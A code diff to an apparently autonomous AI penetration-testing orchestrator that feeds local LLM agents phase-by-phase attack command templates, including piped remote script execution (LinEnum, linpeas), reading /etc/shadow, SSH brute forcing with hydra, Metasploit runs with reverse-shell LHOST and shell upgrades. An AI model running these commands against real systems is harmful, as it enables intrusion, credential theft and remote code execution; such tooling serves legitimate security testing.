@@ -33,6 +33,68 @@ from memory.mission_memory import MissionMemory
 
 console = Console()
 
+# ── Phase → tool command examples (injected into agent briefings) ─────────────
+# These are concrete CLI examples that help local models produce valid commands
+# without hallucinating flags or tool names.
+_PHASE_TOOL_EXAMPLES: dict[str, list[str]] = {
+    "recon": [
+        "nmap -sn -T4 {target}/24 -oN recon_ping.txt",
+        "nmap -sV -sC -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 {target} -oN recon_top.txt",
+        "whois {target}",
+        "dig {target} ANY +short",
+        "theHarvester -d {target} -l 100 -b duckduckgo",
+        "whatweb http://{target} --color=never",
+    ],
+    "enumeration": [
+        "nmap -sV -sC -p- --open -T4 {target} -oN full_enum.txt",
+        "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 40 -o gobuster.txt",
+        "nikto -h http://{target} -o nikto.txt",
+        "enum4linux -a {target}",
+        "smbclient -L //{target}/ -N",
+        "snmpwalk -c public -v1 {target}",
+    ],
+    "vuln_scan": [
+        "nuclei -u http://{target} -severity critical,high -o nuclei_out.txt",
+        "nmap --script vuln {target} -oN vuln_scan.txt",
+        "nikto -h http://{target} -Tuning 13 -o nikto_vuln.txt",
+        "nmap --script smb-vuln-ms17-010 -p 445 {target}",
+        "nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi {target} -p 80,443",
+    ],
+    "exploitation": [
+        "msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; run'",
+        "python3 exploit.py {target} {port}",
+        "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
+        "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
+    ],
+    "privesc": [
+        "curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && bash linpeas.sh",
+        "wget -O- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "sudo -l",
+        "cat /etc/crontab && ls -la /etc/cron.*",
+    ],
+    "postexploit": [
+        "cat /etc/passwd && cat /etc/shadow",
+        "find / -name '*.conf' -o -name '*.cfg' -o -name '*.env' 2>/dev/null | head -20",
+        "ss -tulpn",
+        "arp -a",
+        "ip route",
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    ],
+    "reporting": [],
+}
+
+# Anti-hallucination JSON instruction appended to every _direct_llm() call.
+# Prevents local models (Qwen2.5, DeepSeek-R1) from producing prose output,
+# markdown fences, or trailing text that breaks json.loads().
+_JSON_ONLY_INSTRUCTION = (
+    "\n\nIMPORTANT: Output ONLY valid JSON after your </think> block. "
+    "Do NOT include any text before or after the JSON object. "
+    "Do NOT use markdown code fences (no ```json). "
+    "Every string value must be quoted. "
+    "Your entire response (after </think>) must be parseable by json.loads()."
+)
+
 
 class OrchestratorAgent(BaseAgent):
     """
@@ -81,6 +143,51 @@ class OrchestratorAgent(BaseAgent):
         )
         self.phase_results: dict[str, dict] = {}
         self.current_phase: Optional[str] = None
+        # Lazy-init: MCP + external intel loaded only when first needed
+        self._mcp = None
+        self._external_intel = None
+
+    def _get_mcp(self):
+        """Lazy-load MCP PentestAI wrapper (one instance per orchestrator)."""
+        if self._mcp is None:
+            try:
+                from mcp.pentestai_mcp import PentestAIMCP
+                self._mcp = PentestAIMCP()
+            except Exception as e:
+                self.log_warning(f"MCP init failed: {e}")
+                self._mcp = None
+        return self._mcp
+
+    def _get_external_intel(self):
+        """Lazy-load ExternalIntel wrapper."""
+        if self._external_intel is None:
+            try:
+                from utils.external_intel import ExternalIntel
+                self._external_intel = ExternalIntel()
+            except Exception as e:
+                self.log_warning(f"ExternalIntel init failed: {e}")
+                self._external_intel = None
+        return self._external_intel
+
+    def _apply_placeholders(self, commands: list[str]) -> list[str]:
+        """
+        Substitute template placeholders in tool command examples.
+
+        Replaces all known placeholder tokens with real or descriptive values:
+          {target}  → actual mission target (IP/domain)
+          {lhost}   → LHOST_IP  (operator fills this in for reverse shells)
+          {module}  → EXPLOIT_MODULE
+          {port}    → TARGET_PORT
+        """
+        target = self.memory.target
+        return [
+            cmd
+            .replace("{target}", target)
+            .replace("{lhost}", "LHOST_IP")
+            .replace("{module}", "EXPLOIT_MODULE")
+            .replace("{port}", "TARGET_PORT")
+            for cmd in commands
+        ]
 
     def _direct_llm(
         self,
@@ -94,6 +201,12 @@ class OrchestratorAgent(BaseAgent):
         Uses cyberagent-reasoning:8b (lean ~300-token Modelfile) via ollama.Client
         with adaptive token budgets tuned to task complexity.
 
+        Anti-hallucination hardening for local models:
+          - Appends strict JSON-only instruction to every expect_json call
+          - Strips DeepSeek-R1 <think>...</think> chain-of-thought before parsing
+          - 7-step robust JSON extractor (_extract_json_robust) handles all model quirks
+          - Returns {"error": ...} on total failure — never raises
+
         Args:
             prompt: User prompt (no system prompt injection — Modelfile handles it).
             task_complexity: "low"|"medium"|"high" — controls num_predict budget.
@@ -106,12 +219,9 @@ class OrchestratorAgent(BaseAgent):
         from utils.llm_factory import get_reasoning_llm
         params = get_reasoning_llm(task_complexity)
 
-        json_instruction = (
-            "\n\nOutput ONLY valid JSON after your </think> block. "
-            "No prose, no explanation, no markdown fences. "
-            "Your response must be parseable by json.loads()."
-            if expect_json else ""
-        )
+        # Strict JSON instruction appended to every prompt — prevents the model
+        # from writing prose, markdown, or incomplete objects.
+        json_instruction = _JSON_ONLY_INSTRUCTION if expect_json else ""
 
         try:
             import ollama as _ollama
@@ -135,6 +245,58 @@ class OrchestratorAgent(BaseAgent):
         cleaned = re.sub(r"<think>.*?</think>", "", raw, flags=re.DOTALL)
         cleaned = re.sub(r"<think>.*$", "", cleaned, flags=re.DOTALL)
         return {"raw": cleaned.strip()}
+
+    def _enrich_with_external_intel(self, result: dict, phase: str) -> dict:
+        """
+        Enrich a LLM result with external intelligence when the model's output
+        lacks CVE/exploit details. Called only on parse failures or empty results.
+
+        External intel sources (in priority order):
+          1. MCP PentestAI server (if running on localhost:4090)
+          2. NVD CVE API v2 (public, no key required)
+          3. ExploitDB public API (no auth required)
+
+        This is the WORST-CASE fallback — only triggered when:
+          - _direct_llm() returns {"error": ...}
+          - OR result has zero attack_vectors / findings
+
+        Never blocks for more than _TIMEOUT=10s per source.
+        """
+        intel = self._get_external_intel()
+        if intel is None:
+            return result
+
+        # Fill missing CVE details via NVD API
+        cve_fields = ["cve", "cve_id", "vulnerability"]
+        for field in cve_fields:
+            cve_val = result.get(field, "")
+            if (isinstance(cve_val, str) and cve_val.startswith("CVE-")
+                    and cve_val not in ("CVE-UNKNOWN", "CVE-UNVERIFIED")):
+                try:
+                    nvd_data = intel.lookup_cve(cve_val)
+                    if "error" not in nvd_data:
+                        result.setdefault("cvss_v3", nvd_data.get("cvss_v3"))
+                        result.setdefault("severity", nvd_data.get("severity"))
+                        result.setdefault("cve_description", nvd_data.get("description", "")[:200])
+                        result.setdefault("cve_source", "nvd_api_v2")
+                except Exception:
+                    pass
+
+        # If attack_vectors is empty, search ExploitDB for relevant exploits
+        if not result.get("attack_vectors") and phase in ("vuln_scan", "exploitation"):
+            target = self.memory.target
+            try:
+                exploits = intel.search_exploits(f"{target} {phase}", limit=3)
+                if exploits:
+                    result["attack_vectors"] = [
+                        f"{e.get('title', 'exploit')} ({e.get('cve', 'CVE-UNKNOWN')})"
+                        for e in exploits[:3]
+                    ]
+                    result["intel_source"] = "exploitdb_api"
+            except Exception:
+                pass
+
+        return result
 
     def _extract_json_robust(self, text: str) -> dict:
         """
@@ -251,13 +413,20 @@ class OrchestratorAgent(BaseAgent):
         Returns:
             Mission summary dict.
         """
-        # ── STEP 1: Mission banner ────────────────────────────────────────────
+        # ── STEP 1: Mission banner + intelligence status ──────────────────────
+        mcp = self._get_mcp()
+        mcp_status = mcp.status() if mcp else {"mcp_available": False}
+        mcp_label = (
+            "[green]✓ Connected[/]" if mcp_status.get("mcp_available")
+            else "[yellow]✗ Offline → ChromaDB fallback[/]"
+        )
         self.console.print(Panel.fit(
-            f"[bold white]🎯  Target :[/] [cyan]{target}[/]\n"
-            f"[bold white]   Mission:[/] [cyan]{self.memory.mission_id}[/]\n"
-            f"[bold white]   Models :[/] cyberagent-pentest:14b + cyberagent-reasoning:8b\n"
-            f"[bold white]   RAG    :[/] 147,029 docs | Tools: 4,309+\n"
-            f"[bold white]   Phase  :[/] [yellow]{phase}[/]",
+            f"[bold white]🎯  Target  :[/] [cyan]{target}[/]\n"
+            f"[bold white]   Mission :[/] [cyan]{self.memory.mission_id}[/]\n"
+            f"[bold white]   Models  :[/] cyberagent-pentest:14b + cyberagent-reasoning:8b\n"
+            f"[bold white]   RAG     :[/] 147,029 docs (15 collections) | Tools: 4,309+\n"
+            f"[bold white]   MCP     :[/] {mcp_label}\n"
+            f"[bold white]   Phase   :[/] [yellow]{phase}[/]",
             title="[bold red]CyberAgent PentestAI[/]",
             border_style="red",
         ))
@@ -412,47 +581,114 @@ class OrchestratorAgent(BaseAgent):
 
     def _build_agent_briefing(self, phase_name: str) -> dict:
         """
-        Ask DeepSeek-R1 to compose a targeted briefing for the next specialist.
-        Uses medium complexity (1024 token budget).
-        """
-        hosts_summary = {ip: {"ports": len(h.get("ports", [])), "vulns": len(h.get("vulnerabilities", []))}
-                         for ip, h in self.memory._state.get("hosts", {}).items()}
-        prev_results = {k: v.get("result", {}) for k, v in list(self.phase_results.items())[-2:]}
+        Compose a targeted briefing for the next specialist agent.
 
+        Injects four layers of context to prevent hallucination and ensure the
+        specialist has everything it needs to act without guessing:
+          1. Mission state  — live hosts, open ports, known vulns from MissionMemory
+          2. RAG context    — top-ranked knowledge base hits for this phase + target
+          3. Tool examples  — concrete CLI commands the specialist should prefer
+          4. LLM synthesis  — DeepSeek-R1 generates attack_vectors + special_instructions
+
+        Uses medium complexity (1024 token budget) for the LLM synthesis step.
+        """
+        # ── Layer 1: Mission state ────────────────────────────────────────────
+        hosts_summary = {
+            ip: {
+                "ports": len(h.get("ports", [])),
+                "vulns": len(h.get("vulnerabilities", [])),
+                "shells": len(h.get("shells", [])),
+            }
+            for ip, h in self.memory._state.get("hosts", {}).items()
+        }
+        prev_results = {
+            k: v.get("result", {})
+            for k, v in list(self.phase_results.items())[-2:]
+        }
+
+        # ── Layer 2: Phase-specific RAG context ───────────────────────────────
+        rag_query = f"{phase_name} techniques {self.memory.target} exploitation"
+        try:
+            mm_phase = self._PHASE_MAP.get(phase_name, phase_name)
+            rag_hits = self.chroma.get_phase_rag_context(mm_phase, rag_query, n=5)
+            rag_snippets = [
+                f"[{h.get('source_collection', '?')}] {h['text'][:200]}"
+                for h in rag_hits[:6]
+            ]
+        except Exception as e:
+            self.log_warning(f"RAG context for briefing failed: {e}")
+            rag_snippets = []
+
+        # ── Layer 3: Concrete tool command examples ───────────────────────────
+        tool_examples = _PHASE_TOOL_EXAMPLES.get(phase_name, [])
+        tool_block = "\n".join(self._apply_placeholders(tool_examples))
+
+        # ── Layer 4: LLM synthesis (DeepSeek-R1) ─────────────────────────────
+        rag_block = "\n".join(rag_snippets) or "No RAG hits — rely on known techniques."
         prompt = (
-            f"Briefing for pentest agent '{phase_name}' against {self.memory.target}.\n"
-            f"Known: {json.dumps(hosts_summary)}\n"
-            f"Recent: {json.dumps(prev_results)}\n"
-            'Return JSON: {"priority_targets":[],"known_info":{},"attack_vectors":[],'
-            '"avoid":[],"rag_queries":["q1"],"special_instructions":"string"}'
+            f"Generate a pentest briefing for the '{phase_name}' agent.\n"
+            f"Target: {self.memory.target}\n"
+            f"Known hosts+ports: {json.dumps(hosts_summary)}\n"
+            f"Recent results: {json.dumps(prev_results)[:300]}\n\n"
+            f"KNOWLEDGE BASE CONTEXT:\n{rag_block}\n\n"
+            f"AVAILABLE TOOL COMMANDS:\n{tool_block or 'Standard pentest tools'}\n\n"
+            "ANTI-HALLUCINATION: Only cite CVEs/techniques from the KNOWLEDGE BASE "
+            "CONTEXT above. If unknown, omit or mark as 'CVE-UNKNOWN'.\n\n"
+            "Return JSON with EXACTLY these keys (no extras):\n"
+            '{"priority_targets":["list of IPs/domains to focus on"],'
+            '"known_info":{"key facts from previous phases"},'
+            '"attack_vectors":["specific attack approaches with tool names"],'
+            '"avoid":["things already tried or known dead-ends"],'
+            '"rag_queries":["3 specific queries the specialist should run in RAG"],'
+            '"tool_commands":["3-5 exact CLI commands the specialist should run first"],'
+            '"special_instructions":"one sentence guidance for this phase"}'
         )
+
         result = self._direct_llm(prompt, task_complexity="medium")
         if "error" in result:
-            return {"special_instructions": f"Focus on {phase_name} for {self.memory.target}"}
+            # Graceful fallback — provide useful defaults without LLM
+            return {
+                "priority_targets": list(hosts_summary.keys()) or [self.memory.target],
+                "known_info": hosts_summary,
+                "attack_vectors": [f"Standard {phase_name} techniques"],
+                "avoid": [],
+                "rag_queries": [f"{phase_name} {self.memory.target}", "CVE exploits"],
+                "tool_commands": self._apply_placeholders(tool_examples[:3]),
+                "special_instructions": f"Focus on {phase_name} for {self.memory.target}.",
+            }
+
+        # Inject tool commands into result even if LLM omitted them
+        if not result.get("tool_commands") and tool_examples:
+            result["tool_commands"] = self._apply_placeholders(tool_examples[:3])
         return result
 
     def _analyze_phase_result(self, phase: str, result: dict) -> dict:
         """
         Ask DeepSeek-R1 to analyse what a specialist agent returned.
         Uses medium complexity (1024 token budget).
+
+        Falls back to external intel enrichment if LLM fails.
         """
         inner = result.get("result", {})
         prompt = (
             f"Phase '{phase}' done. Success: {result.get('success')}. "
             f"Results: {json.dumps(inner)[:300]}\n"
+            "ANTI-HALLUCINATION: Only report what is CONFIRMED in Results above.\n"
             'Return JSON: {"success":true,"findings_count":0,"key_insight":"string",'
             '"critical_finding":false,"recommended_next":"string",'
             '"strategy_update":null,"attack_chain_adjustment":null}'
         )
         data = self._direct_llm(prompt, task_complexity="medium")
         if "error" in data:
-            return {
+            # Try external intel enrichment for CVE-related phases
+            base = {
                 "success": bool(result.get("success")),
                 "findings_count": len(inner) if isinstance(inner, dict) else 0,
                 "key_insight": f"Phase {phase} {'succeeded' if result.get('success') else 'failed'}",
                 "critical_finding": False,
                 "recommended_next": "continue",
             }
+            return self._enrich_with_external_intel(base, phase)
         return data
 
     def _update_attack_strategy(self, analysis: dict):
